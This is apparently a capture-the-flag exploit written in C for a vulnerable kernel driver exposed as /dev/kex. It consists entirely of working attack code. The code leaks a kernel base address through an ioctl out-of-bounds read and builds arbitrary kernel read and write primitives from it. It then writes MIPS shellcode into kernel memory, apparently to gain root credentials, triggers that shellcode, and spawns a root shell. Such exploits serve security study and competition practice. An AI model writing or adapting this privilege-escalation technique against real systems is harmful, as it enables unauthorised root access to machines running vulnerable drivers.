#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>

#define ADD 0x43544601
#define GET 0x43544602
#define SET 0x43544603
#define DEL 0x43544606
#define EDIT 0x43544608

char* addr;
int kbase;
int fd;
int kernel_read(int kaddr){
	*(int*)(&addr[0x20])=(kaddr-kbase)/4;
	if( ioctl(fd,GET,addr)){
                perror("ioctl");
                exit(0);
        }
	return  *(int*)(&addr[0x24]);
}
void kernel_write(int kaddr,int val){
	*(int*)(&addr[0x20])=(kaddr-kbase)/4;
	*(int*)(&addr[0x24])=val;
	if( ioctl(fd,SET,addr)){
                perror("ioctl");
                exit(0);
        }

}

int main(){
	fd = open("/dev/kex",O_RDWR);
	if( fd < 0 ){
		perror("fd");
		exit(0);
	}
	addr = (char*)mmap((void*)0x1234000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
	if( ioctl(fd,ADD,addr)){
		perror("ioctl");
                exit(0);
	}
	if( ioctl(fd,ADD,addr)){
		perror("ioctl");
                exit(0);
	}
	int i=0;
	*(int*)(&addr[0x20])=0x100;
	if( ioctl(fd,GET,addr)){
		perror("ioctl");
		exit(0);
        }	
	kbase = *(int*)(&addr[0x24])-0x400;	
	if( ioctl(fd,DEL,addr)){
                perror("ioctl");
                exit(0);
        }
	
	size_t shell[]= {
		0x27bdffe0,
		0xafbf001c,

		0x3c028014,
		0x3442deb0,
		0x00002021,
		0x0040c821,
		0x0320f809,
		0x00000000,

		0x00401821,
		0x00602021,
		0x3c028014,
                0x3442dbb8,
		0x0040c821,
                0x0320f809,
		0x00000000,

		0x8fbf001c,
		0x27bd0020,
		0x03e00008,
	};
	for(i=0;i<sizeof(shell)/sizeof(size_t);i++)
		kernel_write(0xc000c104+i*4,shell[i]);
	ioctl(fd,DEL,addr);
	char* args[]={
		"/bin/sh",
		NULL};
	execve("/bin/sh",args,0);	
}
